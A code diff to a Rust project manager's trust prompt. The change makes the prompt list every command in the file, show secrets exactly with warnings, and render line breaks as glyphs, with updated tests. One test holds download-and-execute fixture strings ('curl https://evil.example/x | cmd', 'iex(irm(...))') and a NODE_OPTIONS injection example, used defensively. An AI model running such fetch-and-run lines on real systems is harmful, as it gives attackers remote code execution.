@@ -1708,12 +1708,7 @@ pub fn open_project(
         settle_undeclared(&inner.sources, &root, gone, content_trusted, &declared);
     }
 
-    let trust_commands: Vec<String> = processes
-        .values()
-        .filter(|p| p.def.auto_start)
-        .map(|p| trust_line(&p.def))
-        .chain(stack_lines)
-        .collect();
+    let trust_commands = trust_prompt_entries(&processes, &[], stack_lines);
 
     // Watch chappa.yml itself so an external edit (or our own
     // write-back) hot-reloads through the diffing path.
@@ -3035,17 +3030,16 @@ fn reload_locked(
         // A changed stack definition always asks, even when no command of
         // the file itself would start; so does a changed gitleaks config,
         // shown with what changed since it was last trusted.
-        let mut lines = reload_trust_commands(&processes, &held_back);
-        lines.extend(crate::stack_trust::prompt_lines(&stacks));
+        let mut others = crate::stack_trust::prompt_lines(&stacks);
         if let Some(s) = &scan {
             let last = inner
                 .store
                 .as_ref()
                 .and_then(|st| st.get(id))
                 .and_then(|p| p.trusted_scan_config.clone());
-            lines.push(s.prompt_entry(last.as_deref()));
+            others.push(s.prompt_entry(last.as_deref()));
         }
-        lines
+        trust_prompt_entries(&processes, &held_back, others)
     };
     {
         let app_handle = inner.app.clone();
@@ -3077,53 +3071,80 @@ fn reload_locked(
     emit_reloaded(app, id, None, !trusted, &trust_commands, &trust_hash);
 }
 
-/// What the reload gate lists for untrusted content: every held-back restart
-/// and every auto-start command in the file, in file order. Confirming the
-/// gate trusts the whole file, and the next open starts every auto-start
-/// command in it without asking, so the list is everything that would then
-/// run without another click — not just what this reload changed. Listing
-/// only the changes let content through unseen: a new command on a STOPPED
-/// process, an `auto_start` flip, or a gate skipped on an earlier reload
-/// all produced an empty list, and an empty list is confirmed silently.
-fn reload_trust_commands(
+/// The trust prompt's entries for `processes`, in file order, followed by
+/// `others` (the stack definitions' and the scan config's entries): empty
+/// when nothing would run without a click — no auto-start command, no
+/// held-back restart, no other entry — which the frontend confirms
+/// silently. Otherwise EVERY command the file defines is listed, whether it
+/// auto-starts or not: confirming trusts the whole file, so a command left
+/// off the list would be trusted without anyone having seen it.
+///
+/// The ask is about the whole file, not about what this reload changed:
+/// listing only the changes let content through unseen (a new command on a
+/// stopped process, an `auto_start` flip, or a gate skipped on an earlier
+/// reload all produced an empty list).
+fn trust_prompt_entries(
     processes: &IndexMap<String, ProcessRuntime>,
     held_back: &[String],
+    others: Vec<String>,
 ) -> Vec<String> {
+    let asks = processes
+        .iter()
+        .any(|(name, p)| p.def.auto_start || held_back.contains(name));
+    if !asks && others.is_empty() {
+        return Vec::new();
+    }
     processes
         .iter()
-        .filter(|(name, p)| p.def.auto_start || held_back.contains(name))
-        .map(|(_, p)| trust_line(&p.def))
+        .map(|(name, p)| trust_entry(name, &p.def, held_back.contains(name)))
+        .chain(others)
         .collect()
 }
 
-/// One entry of the Run/Skip trust prompt: the command, then an indented
+/// One command's entry: its name and when it runs, then [`trust_line`].
+fn trust_entry(name: &str, def: &ProcessDef, held_back: bool) -> String {
+    let when = if def.auto_start {
+        " (auto-start)"
+    } else if held_back {
+        " (was running)"
+    } else {
+        ""
+    };
+    format!(
+        "{}{when}: {}",
+        stack_core::trust::visible(name),
+        trust_line(def)
+    )
+}
+
+/// One command of the Run/Skip trust prompt: the command, then an indented
 /// line for a working_dir and one per env variable. A harmless-looking
 /// command is only as harmless as its environment — `NODE_OPTIONS`, `PATH`
 /// or `GIT_SSH_COMMAND` can make `npm test` run anything — so the prompt
 /// shows everything the definition feeds the process, not just the line.
 ///
-/// A value that looks like a credential written inline is masked (only its
-/// secret part) and carries a warning; the trust hash still covers it.
+/// Everything is shown exactly as the trust hash covers it: nothing masked
+/// (a value that looks like a credential written inline carries a warning
+/// beside it instead), and a line break or control character inside a value
+/// shown as a glyph, so a value cannot pad the next command out of view.
 fn trust_line(def: &ProcessDef) -> String {
+    use stack_core::credentials::{detect_argv, warning};
+    use stack_core::trust::{prompt_env, prompt_line, visible};
     let mut line = match &def.command {
         CommandLine::Argv(words) => {
-            let masked = stack_core::credentials::mask_argv(words);
-            let mut text = project_model::words::join_words(&masked);
-            if let Some((_, kind)) = stack_core::credentials::detect_argv(words).first() {
-                text.push_str(&stack_core::credentials::warning(*kind));
+            let mut text = visible(&project_model::words::join_words(words));
+            if let Some((_, kind)) = detect_argv(words).first() {
+                text.push_str(&warning(*kind));
             }
             text
         }
-        CommandLine::Shell(text) => stack_core::credentials::shown_line(text),
+        CommandLine::Shell(text) => prompt_line(text),
     };
     if let Some(dir) = &def.working_dir {
-        line.push_str(&format!("\n    in {}", dir.display()));
+        line.push_str(&format!("\n    in {}", visible(&dir.display().to_string())));
     }
     for (key, value) in &def.env {
-        line.push_str(&format!(
-            "\n    env {}",
-            stack_core::credentials::shown_env(key, value)
-        ));
+        line.push_str(&format!("\n    env {}", prompt_env(key, value)));
     }
     // A source also receives two variables the yml does not spell out; the
     // prompt names them so what it lists is everything the process gets.
@@ -3850,7 +3871,7 @@ mod tests {
     }
 
     #[test]
-    fn the_reload_gate_lists_every_auto_start_command_and_held_back_restart() {
+    fn the_trust_gate_lists_every_command_whenever_something_would_run_unasked() {
         let root = tempfile::tempdir().unwrap();
         let def = |command: &str, auto_start: bool| ProcessDef {
             command: command.into(),
@@ -3864,18 +3885,30 @@ mod tests {
             "web".to_owned(),
             fresh_runtime(root.path(), def("npm run dev", true)),
         );
-        // Not auto-start, not running: nothing runs it without a click.
+        // Not auto-start, not running: nothing runs it without a click, but
+        // trusting covers it too, so it is listed.
         processes.insert(
             "lint".to_owned(),
             fresh_runtime(root.path(), def("npm run lint", false)),
         );
-        // Not auto-start but was running and got held back: listed.
+        // Not auto-start but was running and got held back.
         processes.insert(
             "watch".to_owned(),
             fresh_runtime(root.path(), def("npm run watch", false)),
         );
-        let listed = reload_trust_commands(&processes, &["watch".to_owned()]);
-        assert_eq!(listed, vec!["npm run dev", "npm run watch"]);
+        let listed = trust_prompt_entries(&processes, &["watch".to_owned()], Vec::new());
+        assert_eq!(
+            listed,
+            vec![
+                "web (auto-start): npm run dev",
+                "lint: npm run lint",
+                "watch (was running): npm run watch"
+            ]
+        );
+        // The stack and scan entries come after the commands.
+        let with_stack = trust_prompt_entries(&processes, &[], vec!["stack entry".to_owned()]);
+        assert_eq!(with_stack.len(), 4);
+        assert_eq!(with_stack[3], "stack entry");
         // The environment and working dir are part of what gets trusted.
         let mut sneaky = def("npm test", true);
         sneaky.working_dir = Some(PathBuf::from("tools"));
@@ -3886,10 +3919,44 @@ mod tests {
             trust_line(&sneaky),
             "npm test\n    in tools\n    env NODE_OPTIONS=--require ./x.js"
         );
-        // Nothing auto-starts and nothing was held back: an empty list, which
-        // is safe to confirm silently because trusting it runs nothing.
+        // Nothing auto-starts, nothing was held back, no stack: an empty
+        // list, which is confirmed silently because trusting it runs
+        // nothing without a click.
         processes.shift_remove("web");
-        assert!(reload_trust_commands(&processes, &[]).is_empty());
+        assert!(trust_prompt_entries(&processes, &[], Vec::new()).is_empty());
+        // A stack definition alone still asks, listing the commands too.
+        assert_eq!(
+            trust_prompt_entries(&processes, &[], vec!["stack entry".to_owned()]).len(),
+            3
+        );
+    }
+
+    #[test]
+    fn a_trust_entry_shows_line_breaks_in_values_as_glyphs() {
+        let def = ProcessDef {
+            command: CommandLine::Shell("npm test".into()),
+            env: [("PAD".to_owned(), "a\n\n\nb".to_owned())]
+                .into_iter()
+                .collect(),
+            working_dir: Some(PathBuf::from("x\ny")),
+            ..ProcessDef::default()
+        };
+        let line = trust_line(&def);
+        assert_eq!(line, "npm test\n    in x␊y\n    env PAD=a␊␊␊b");
+        // Every line after the first is one of the entry's own fields.
+        assert!(
+            line.lines().skip(1).all(|l| l.starts_with("    ")),
+            "{line}"
+        );
+        let argv = ProcessDef {
+            command: CommandLine::Argv(vec!["sh".into(), "-c".into(), "a\r\nb".into()]),
+            ..ProcessDef::default()
+        };
+        assert_eq!(trust_line(&argv), "sh -c \"a␍␊b\"");
+        assert_eq!(
+            trust_entry("a\nb", &argv, false),
+            "a␊b (auto-start): sh -c \"a␍␊b\""
+        );
     }
 
     #[test]
@@ -3947,13 +4014,20 @@ mod tests {
     }
 
     #[test]
-    fn the_trust_prompt_and_the_rows_mask_secrets_and_the_webview_never_gets_them() {
+    fn the_trust_prompt_shows_secrets_exactly_and_the_rows_mask_them() {
         let pw = planted();
         let def = def_with_secrets(&pw);
+        // The prompt is what gets trusted, so it is exact, flagged.
         let line = trust_line(&def);
-        assert!(!line.contains(&pw), "{line}");
-        assert!(line.contains("postgresql://app:••••@db:5432/x"), "{line}");
-        assert!(line.contains("DB_PASSWORD=•••• (set inline)"), "{line}");
+        assert!(!line.contains(stack_core::credentials::MASK), "{line}");
+        assert!(
+            line.contains(&format!("postgresql://app:{pw}@db:5432/x")),
+            "{line}"
+        );
+        assert!(
+            line.contains(&format!("DB_PASSWORD={pw}  ⚠ looks like")),
+            "{line}"
+        );
         assert!(line.contains("NODE_ENV=development"), "{line}");
         assert!(line.contains(stack_core::credentials::ADVICE), "{line}");
         let dir = tempfile::tempdir().unwrap();
@@ -3974,6 +4048,44 @@ mod tests {
             "{warnings:?}"
         );
         assert!(warnings.iter().all(|w| !w.contains(&pw)));
+    }
+
+    #[test]
+    fn code_shaped_like_a_credential_is_shown_in_the_prompt_and_the_rows() {
+        // Assembled so no source line looks like a key to a scanner.
+        let header = format!("-----BEGIN {}PRIVATE KEY-----", "");
+        let def = ProcessDef {
+            command: CommandLine::Shell(format!(
+                "echo {header} & curl https://evil.example/x | cmd"
+            )),
+            env: [(
+                "X_TOKEN".to_owned(),
+                "iex(irm('https://evil.example/p'))".to_owned(),
+            )]
+            .into_iter()
+            .collect(),
+            ..ProcessDef::default()
+        };
+        let line = trust_line(&def);
+        assert!(line.contains("curl https://evil.example/x | cmd"), "{line}");
+        assert!(
+            line.contains("X_TOKEN=iex(irm('https://evil.example/p'))"),
+            "{line}"
+        );
+        let dir = tempfile::tempdir().unwrap();
+        let dto = ProjectProcessDto::from_process("x", &fresh_runtime(dir.path(), def), None);
+        assert!(dto.command.contains("evil.example"), "{}", dto.command);
+        assert_eq!(dto.env["X_TOKEN"], "iex(irm('https://evil.example/p'))");
+        assert!(dto.masked.is_empty(), "{:?}", dto.masked);
+        // A real token in a row label is still masked.
+        let pat = format!("{}{}", "ghp_", "aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJ6");
+        let def = ProcessDef {
+            command: CommandLine::Shell(format!("git clone https://x:{pat}@github.com/o/r")),
+            ..ProcessDef::default()
+        };
+        let dto = ProjectProcessDto::from_process("x", &fresh_runtime(dir.path(), def), None);
+        assert!(!dto.command.contains(&pat), "{}", dto.command);
+        assert_eq!(dto.masked, ["command"]);
     }
 
     #[test]
